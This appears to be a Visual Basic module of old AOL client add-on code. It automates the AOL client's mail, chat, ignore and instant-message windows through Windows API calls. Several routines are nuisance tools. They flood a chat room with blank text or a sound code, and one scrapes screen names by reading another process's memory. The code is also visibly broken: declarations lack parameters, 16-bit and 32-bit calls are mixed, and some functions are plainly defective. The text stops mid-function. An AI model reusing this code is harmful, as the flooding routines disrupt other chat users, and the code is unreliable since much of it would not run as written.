Declare Function extfn1B50 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn1C30 Lib "User" Alias "SetCursor" () As Integer
Declare Function extfn1E28 Lib "User" Alias "showwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn1DB8 Lib "User" Alias "SetWindowText" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn14F8 Lib "Kernel" Alias "lstrlen" () As Integer
Declare Function extfn998 Lib "User" Alias "enumchildwindows" () As Integer
Declare Function extfnFB8 Lib "User" Alias "GETnextwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfnA08 Lib "User" Alias "ExitWindows" () As Integer
Declare Function extfnDF8 Lib "User" Alias "GetFreeSystemResources" (ByVal p1%) As Integer
Declare Function extfnC38 Lib "User" Alias "GetClassWord" () As Integer
Declare Function extfn1BF8 Lib "User" Alias "SetClassWord" () As Integer
Declare Function extfnD88 Lib "User" Alias "GetFocus" () As Integer
Declare Function extfn1CA0 Lib "User" Alias "SetFocus" (ByVal p1%) As Integer
Declare Function extfn1300 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfnAE8 Lib "User" Alias "FindWindow" (ByVal p1 As Any, ByVal p2 As Any) As Integer
Declare Function extfnB20 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfnB58 Lib "User" Alias "FindWindow" () As Integer
Declare Sub extsub1F08 Lib "User" Alias "UpdateWindow" ()
Declare Sub extsub1DF0 Lib "User" Alias "ShowOwnedPopups" ()
Declare Sub extsub1D80 Lib "User" Alias "SetWindowPos" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4%, ByVal p5%, ByVal p6%, ByVal p7%)
Declare Sub extsub8F0 Lib "User" Alias "DrawMenuBar" ()
Declare Sub extsub1140 Lib "User" Alias "GetScrollRange" ()
Declare Sub extsub1C68 Lib "User" Alias "SetCursorPos" ()
Declare Function extfn458 Lib "APIGuide.Dll" Alias "agGetStringFromLPSTR" (ByVal p1&) As String
Declare Sub extsub148 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsub180 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsub228 Lib "APIGuide.Dll" Alias "agDWordTo2Integers" ()
Declare Sub extsub538 Lib "APIGuide.Dll" Alias "agOutp" ()
Declare Sub extsub570 Lib "APIGuide.Dll" Alias "agOutpw" ()
Declare Sub extsub1808 Lib "VBMsg.Vbx" Alias "ptGetTypeFromAddress" ()
Declare Sub extsub15D8 Lib "VBMsg.Vbx" Alias "ptCopyTypeToAddress" ()
Declare Sub extsub19C8 Lib "VBMsg.Vbx" Alias "ptSetControlModel" ()
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Public Declare Function GetCapture Lib "user32" () As Long
Public Declare Function SetCapture Lib "user32" (ByVal hwnd As Long) As Long
Declare Sub extsub1BC0 Lib "GDI" Alias "SetBKColor" ()
Declare Sub extsub1A00 Lib "GDI" Alias "Rectangle" ()
Declare Sub extsub8B8 Lib "GDI" Alias "DeleteObject" ()

Public Const SRCCOPY = &HCC0020

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203

Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const Flags = SWP_NOMOVE Or SWP_NOSIZE

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10
     
Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4

Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
Public Const MAX_WSADescription = 256
Public Const MAX_WSASYSStatus = 128
Public Const ERROR_SUCCESS       As Long = 0
Public Const WS_VERSION_REQD     As Long = &H101
Public Const WS_VERSION_MAJOR    As Long = WS_VERSION_REQD \ &H100 And &HFF&
Public Const WS_VERSION_MINOR    As Long = WS_VERSION_REQD And &HFF&
Public Const MIN_SOCKETS_REQD    As Long = 1
Public Const SOCKET_ERROR        As Long = -1

Public Type HOSTENT
   hName      As Long
   hAliases   As Long
   hAddrType  As Integer
   hLen       As Integer
   hAddrList  As Long
End Type

Public Type WSADATA
   wVersion      As Integer
   wHighVersion  As Integer
   szDescription(0 To MAX_WSADescription)   As Byte
   szSystemStatus(0 To MAX_WSASYSStatus)    As Byte
   wMaxSockets   As Integer
   wMaxUDPDG     As Integer
   dwVendorInfo  As Long
End Type
Global iTPPY As Long
Global iTPPX As Long






Function TimeTill2000() As String
Dim RetVal$
our = Hour(Time)
iin = Minute(Time)
Sex = Second(Time)
dye = Day(Date)
yer = Year(Date)
mth = Month(Date)
If yer = 2000 Then
    TimeTill2000 = "It's 2000, YEAY!"
    Exit Function
End If
mth = 12 - mth
dye = 31 - dye
our = 23 - our
iin = 59 - iin
Sex = 59 - Sex
RetVal = mth & " months, " & dye & " days, " & our & " hours, "
RetVal = RetVal & iin & " minutes, " & Sex & " seconds until 2000."
TimeTill2000 = RetVal
End Function
Sub EightBallBot()
'need:
'1 textbox, 1 label
'Text1 is what u r asking, and the label where u randomize
Label1.Caption = Int(Rnd * 9)
SendChat ("8Ball Bot Loaded")
Timeout (0.4)
SendChat (Text1.Text & " = Question")
    If Label1.Caption = "1" Then
    SendChat ("Excellent Chance!")
    End If
If Label1.Caption = "2" Then
SendChat ("Great Chance!")
End If
    If Label1.Caption = "3" Then
    SendChat ("Good Chance!")
    End If
If Label1.Caption = "4" Then
SendChat ("OK Chance!")
End If
    If Label1.Caption = "5" Then
    SendChat ("Bad Chance!")
    End If
If Label1.Caption = "6" Then
SendChat ("Very Bad Chance!")
End If
    If Label1.Caption = "7" Then
    SendChat ("0% Chance!")
    End If
If Label1.Caption = "8" Then
SendChat ("Ur having a horrible day!")
End If
End Sub

Public Sub MailOpenNew(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Sub MailOpenOld(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub

Public Sub MailOpenSent(Index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    TabPage& = FindWindowEx(TabControl&, TabPage&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < Index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub


Sub Chat_Clear()
Dim ClearNow As String, ChatWin As Long
ClearNow$ = Format$(String$(100, Chr$(13)))
ChatWin& = FindChatRoom
If ChatWin& = 0 Then Exit Sub
    Call SendMEssageByString(ChatWin&, WM_SETTEXT, 0, ClearNow$)
End Sub
   Public Function GetIPAddress() As String

   Dim sHostName    As String * 256
   Dim lpHost    As Long
   Dim HOST      As HOSTENT
   Dim dwIPAddr  As Long
   Dim tmpIPAddr() As Byte
   Dim i         As Integer
   Dim sIPAddr  As String
   
   If Not SocketsInitialize() Then
      GetIPAddress = ""
      Exit Function
   End If
   If gethostname(sHostName, 256) = SOCKET_ERROR Then
      GetIPAddress = ""
      MsgBox "Windows Sockets error " & Str$(WSAGetLastError()) & _
              " has occurred. Unable to successfully get Host Name."
      SocketsCleanup
      Exit Function
   End If
   sHostName = Trim$(sHostName)
   lpHost = gethostbyname(sHostName)
    
   If lpHost = 0 Then
      GetIPAddress = ""
      MsgBox "Windows Sockets are not responding. " & _
              "Unable to successfully get Host Name."
      SocketsCleanup
      Exit Function
   End If
   CopyMemory HOST, lpHost, Len(HOST)
   CopyMemory dwIPAddr, HOST.hAddrList, 4
   ReDim tmpIPAddr(1 To HOST.hLen)
   CopyMemory tmpIPAddr(1), dwIPAddr, HOST.hLen
   For i = 1 To HOST.hLen
      sIPAddr = sIPAddr & tmpIPAddr(i) & "."
   Next
   GetIPAddress = Mid$(sIPAddr, 1, Len(sIPAddr) - 1)
   
   SocketsCleanup
    
End Function
Public Function GetIPHostName() As String

    Dim sHostName As String * 256
    
    If Not SocketsInitialize() Then
        GetIPHostName = ""
        Exit Function
    End If
    
    If gethostname(sHostName, 256) = SOCKET_ERROR Then
        GetIPHostName = ""
        MsgBox "Windows Sockets error " & Str$(WSAGetLastError()) & _
                " has occurred.  Unable to successfully get Host Name."
        SocketsCleanup
        Exit Function
    End If
    
    GetIPHostName = Left$(sHostName, InStr(sHostName, Chr(0)) - 1)
    SocketsCleanup

End Function
Public Function HiByte(ByVal wParam As Integer)

    HiByte = wParam \ &H100 And &HFF&
 
End Function
Public Function LoByte(ByVal wParam As Integer)

    LoByte = wParam And &HFF&

End Function
Public Sub SocketsCleanup()

    If WSACleanup() <> ERROR_SUCCESS Then
        MsgBox "Socket error occurred in Cleanup."
    End If
    
End Sub
Public Function SocketsInitialize() As Boolean

   Dim WSAD As WSADATA
   Dim sLoByte As String
   Dim sHiByte As String
   
   If WSAStartup(WS_VERSION_REQD, WSAD) <> ERROR_SUCCESS Then
      MsgBox "The 32-bit Windows Socket is not responding."
      SocketsInitialize = False
      Exit Function
   End If
   
   
   If WSAD.wMaxSockets < MIN_SOCKETS_REQD Then
        MsgBox "This application requires a minimum of " & _
                CStr(MIN_SOCKETS_REQD) & " supported sockets."
        
        SocketsInitialize = False
        Exit Function
   End If
   
   
   If LoByte(WSAD.wVersion) < WS_VERSION_MAJOR Or _
     (LoByte(WSAD.wVersion) = WS_VERSION_MAJOR And _
      HiByte(WSAD.wVersion) < WS_VERSION_MINOR) Then
      
      sHiByte = CStr(HiByte(WSAD.wVersion))
      sLoByte = CStr(LoByte(WSAD.wVersion))
      
      MsgBox "Sockets version " & sLoByte & "." & sHiByte & _
             " is not supported by 32-bit Windows Sockets."
      
      SocketsInitialize = False
      Exit Function
      
   End If
    SocketsInitialize = True
End Function
Sub ChaoS_AntiPuntDis()
' this anti punt goes in a timer with an
' interval of about 50-100
' this will also distinguish whether the IM contains
' the h3 or the CTRL Backspace punt codes
'just type  Call S_AntiPuntDis in the timer code

AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
Im% = FindChildByTitle(MDI%, ">Instant Message From:")
rch2% = FindChildByClass(Im%, "RICHCNTL")
nme = S_SnfromIM
X = SnoW_Readwin(rch2%)
If InStr(X, "    ") Then
Do
s = sendmessagebynum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
End If

If InStr(X, "") Then
Do
s = sendmessagebynum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
End If

End Sub
Function SnoW_Readwin(GetThis As Integer) As String
'This can get a window's caption or get text from just
'about anything that has text including _AOL_EDIT.

'Example:
'WinCaption$ = AC_GetWinText(Pref%)

BufLen% = sendmessagebynum(GetThis%, WM_GETTEXTLENGTH, 0, 0)
Buffer$ = String(BufLen%, 0)
q% = SendMEssageByString(GetThis%, WM_GETTEXT, BufLen% + 1, Buffer$)
DoEvents
SnoW_Readwin$ = TrimSpaces(Buffer$)
End Function
Function r_backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = NextChr$ & newsent$
Loop
r_backwards = newsent$
SendChat (newsent$)
End Function
Function r_dots(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let NextChr$ = NextChr$ + "•"
Let newsent$ = newsent$ + NextChr$
Loop
r_dots = newsent$
SendChat (newsent$)
End Function
Sub AOLAnti() ' I DID NOT RITE THIS SUB!!!!!!!  CREDIT GOS 2 CHAOS!23
Do
anti% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(anti%, "RICHCNTL")
Call AOLSetText(anti%, "Hølÿ Gräîl Anti, do not close this window until Punt has stopped!")
DoEvents:
If IMRICH% <> 0 Then
Lab = sendmessagebynum(IMRICH%, WM_CLOSE, 0, 0)
Lab = sendmessagebynum(IMRICH%, WM_CLOSE, 0, 0)
LabHIDE = showwindow(anti%, SW_HIDE)
End If
Loop
End Sub
Function CD_ChangeTrack(track&)
    mciSendString "seek cd to " & Str(track), 0, 0, 0
End Function


Sub CD_CloseDoor()
    mciSendString "set cd door closed", 0, 0, 0
End Sub

Function CD_IsCDMusic&()
    Dim Bleh As String * 30, s As Long, CD_IsMusic As Boolean
    mciSendString "status cd media present", s, Len(s), 0
    CD_IsMusic = Bleh
End Function

Function CD_NumOfTracks&()
    Dim Bleh As String * 30, s As Long
    mciSendString "status cd number of tracks wait", s, Len(s), 0
    CD_NumOfTracks = CInt(Mid$(Bleh, 1, 2))
End Function

Sub CD_OpenDoor()
    mciSendString "set cd door open", 0, 0, 0
End Sub

Sub CD_Pause()
    mciSendString "pause cd", 0, 0, 0
End Sub


Sub CD_Play()
    mciSendString "play cd", 0, 0, 0
End Sub
Function CD_Stop()
    mciSendString "stop cd wait", 0, 0, 0
End Function
Sub Chat_Annoy()
'This Is FuN
    Call SendChat("{s *a:\spinning}{s *a:\}")
End Sub

Public Sub Button(mButton As Long)
    Call SendMessage(mButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(mButton&, WM_KEYUP, VK_SPACE, 0&)
End Sub
Public Sub ChatIgnoreByIndex(Index As Long)
    Dim Room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, A As Long, Count As Long
    Count& = RoomCount&
    If Index& > Count& - 1 Then Exit Sub
    Room& = FindRoom&
    sList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
        DoEvents
        iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    DoEvents
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
    Do
        DoEvents
        A& = SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
        Call PostMessage(iCheck&, WM_LBUTTONDOWN, 0&, 0&)
        DoEvents
        Call PostMessage(iCheck&, WM_LBUTTONUP, 0&, 0&)
        DoEvents
    Loop Until A& <> 0&
    DoEvents
    Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub ChatIgnoreByName(name As String)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, Index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    Room& = FindRoom&
    If Room& = 0& Then Exit Sub
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For Index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If ScreenName$ <> GetUser$ And LCase(ScreenName$) = LCase(name$) Then
                lIndex& = Index&
                Call ChatIgnoreByIndex(lIndex&)
                DoEvents
                Exit Sub
            End If
        Next Index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Function ChatLineMsg(TheChatLine As String) As String
    If InStr(TheChatLine, Chr(9)) = 0 Then
        ChatLineMsg = ""
        Exit Function
    End If
    ChatLineMsg = Right(TheChatLine, Len(TheChatLine) - InStr(TheChatLine, Chr(9)))
End Function
Public Function ChatLineSN(TheChatLine As String) As String
    If InStr(TheChatLine, ":") = 0 Then
        ChatLineSN = ""
        Exit Function
    End If
    ChatLineSN = Left(TheChatLine, InStr(TheChatLine, ":") - 1)
End Function


Public Function CheckIMs(person As String) As Boolean
    Dim AOL As Long, MDI As Long, Im As Long, Rich As Long
    Dim Available As Long, Available1 As Long, Available2 As Long
    Dim Available3 As Long, oWindow As Long, oButton As Long
    Dim oStatic As Long, oString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:" & person$)
    Do
        DoEvents
        Im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(Im&, 0&, "RICHCNTL", vbNullString)
        Available1& = FindWindowEx(Im&, 0&, "_AOL_Icon", vbNullString)
        Available2& = FindWindowEx(Im&, Available1&, "_AOL_Icon", vbNullString)
        Available3& = FindWindowEx(Im&, Available2&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available3&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(Im&, Available&, "_AOL_Icon", vbNullString)
    Loop Until Im& <> 0& And Rich <> 0& And Available& <> 0& And Available& <> Available1& And Available& <> Available2& And Available& <> Available3&
    DoEvents
    Call SendMessage(Available&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Available&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        oWindow& = FindWindow("#32770", "America Online")
        oButton& = FindWindowEx(oWindow&, 0&, "Button", "OK")
    Loop Until oWindow& <> 0& And oButton& <> 0&
    Do
        DoEvents
        oStatic& = FindWindowEx(oWindow&, 0&, "Static", vbNullString)
        oStatic& = FindWindowEx(oWindow&, oStatic&, "Static", vbNullString)
        oString$ = GetText(oStatic)
    Loop Until oStatic& <> 0& And Len(oString$) > 15
    If InStr(oString$, "is online and able to receive") <> 0 Then
        CheckIMs = True
    Else
        CheckIMs = False
    End If
    Call SendMessage(oButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(oButton&, WM_KEYUP, VK_SPACE, 0&)
    Call PostMessage(Im&, WM_CLOSE, 0&, 0&)
End Function
Public Sub CloseOpenMails()
    Dim OpenSend As Long, OpenForward As Long
    Do
        DoEvents
        OpenSend& = FindSendWindow
        OpenForward& = FindForwardWindow
        Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
        DoEvents
        Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
        DoEvents
    Loop Until OpenSend& = 0& And OpenForward& = 0&
End Sub



Public Sub CloseWindow(Window As Long)
    Call PostMessage(Window&, WM_CLOSE, 0&, 0&)
End Sub

Function AddListToString(TheList As ListBox)
For DoList = 0 To TheList.ListCount - 1
AddListToString = AddListToString & TheList.List(DoList) & ", "
Next DoList
AddListToString = Mid(AddListToString, 1, Len(AddListToString) - 2)
End Function

Public Sub Form_Explode(Form As Form, Movement As Integer)
'Call this in form load or unload
    Dim myRect As RECT
    Dim formWidth As Integer, formHeight As Integer, i As Integer
    Dim X As Integer, Y As Integer
    Dim cx As Integer, cy As Integer
    Dim TheScreen As Long, Brush As Long
    GetWindowRect Form.hwnd, myRect
        formWidth% = (myRect.Right - myRect.Left)
        formHeight% = myRect.Bottom - myRect.Top
            TheScreen& = GetDC(0)
            Brush& = CreateSolidBrush(Form.BackColor)
            For i% = 1 To Movement%
                cx% = formWidth * (i% / Movement%)
                cy% = formHeight * (i% / Movement%)
                X% = myRect.Left + (formWidth% - cx%) / 2
                Y = myRect.Top + (formHeight% - cy%) / 2
                Rectangle TheScreen, X%, Y%, X% + cx%, Y% + cy%
            Next i%
                X% = ReleaseDC(0, TheScreen&)
                DeleteObject (Brush&)
End Sub
Public Sub Form_Implode(Form As Form, Movement As Integer)
'Call this in form load or unload
'Example ImplodeForm FormName,1000
'the bigger the interval the more
'effect you get
    Dim myRect As RECT
    Dim formWidth As Integer, formHeight As Integer
    Dim i As Integer, X As Integer
    Dim Y As Integer, cx As Integer, cy As Integer
    Dim TheScreen As Long, Brush As Long
    GetWindowRect Form.hwnd, myRect
        formWidth% = (myRect.Right - myRect.Left)
        formHeight% = myRect.Bottom - myRect.Top
            TheScreen& = GetDC(0)
            Brush& = CreateSolidBrush(Form.BackColor)
            For i% = Movement% To 1 Step -1
                cx% = formWidth% * (i% / Movement%)
                cy% = formHeight% * (i% / Movement%)
                X% = myRect.Left + (formWidth% - cx%) / 2
                Y% = myRect.Top + (formHeight% - cy%) / 2
                Rectangle TheScreen&, X%, Y%, X% + cx%, Y% + cy%
            Next i%
                X% = ReleaseDC(0, TheScreen&)
                DeleteObject (Brush&)
End Sub
Public Sub ShowWelcomeWindow()
    Dim AOL As Long, wel As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    wel& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    SeeWindow (wel&)
'Shows the aol welcome window after you hide it
End Sub
Public Sub SeeWindow(hwnd As Long)
    Call showwindow(hwnd&, SW_SHOW)
'shows a hidden window
End Sub
Sub ChatClear()
'This just clears the chat
For i = 1 To 1900
A = A + " "
Next
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & A)
Timeout 0.001
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & A)
Timeout 0.001
SendChat ("<FONT COLOR=#FFFFF0>.<p=" & A)
End Sub
Public Sub Sign_Off(YouSure As Boolean)
    Dim ao As Long, Off As String
    Dim Respond As Long
    ao& = FindWindow("AOL Frame25", vbNullString)
    Off$ = "Sign Off"
    Respond& = MsgBox("Exit AoL Now?", vbYesNo, "JeRmZ")
    If Respond = vbYes Then
        YouSure = True
        Call Run_MenuByString(ao&, Off$)
    Else
        YouSure = False
        Exit Sub
    End If
'Shuts down aol but will ask first
End Sub
Public Sub Run_MenuByString(App As Long, sString As String)
    Dim tSearch As Long, mnuCount As Integer
    Dim fString As Integer, theSearch As Long
    Dim itmCount As Long, getStr As Integer
    Dim sCount As Long, Buffer As String
    Dim strMnu As Long, mnuItem As Long
    Dim rIt As Long
    tSearch& = GetMenu(App&)
    mnuCount% = GetMenuItemCount(tSearch&)
    For fString% = 0 To mnuCount% - 1
        theSearch& = GetSubMenu(tSearch&, fString%)
        itmCount& = GetMenuItemCount(theSearch&)
        For getStr% = 0 To itmCount& - 1
            sCount& = GetMenuItemID(theSearch&, getStr%)
            Buffer$ = String$(100, " ")
            strMnu& = GetMenuString(tSearch&, sCount&, Buffer$, 100, 1)
            If InStr(UCase(Buffer$), UCase(sString$)) Then
                mnuItem& = sCount&
                GoTo Same
           End If
        Next getStr%
    Next fString%
Same:
    rIt& = SendMessageLong(App&, WM_COMMAND, mnuItem&, 0&)
End Sub
Public Sub HideWelcomeWindow()
    Dim AOL As Long, wel As Long, MDI As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    wel& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    HideWindow (wel&)
'Hides the aol welcome window
End Sub
Public Sub HideWindow(hwnd As Long)
    Call showwindow(hwnd&, SW_HIDE)
'Hides the window you want
End Sub
Function AoL4_ImBlackBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
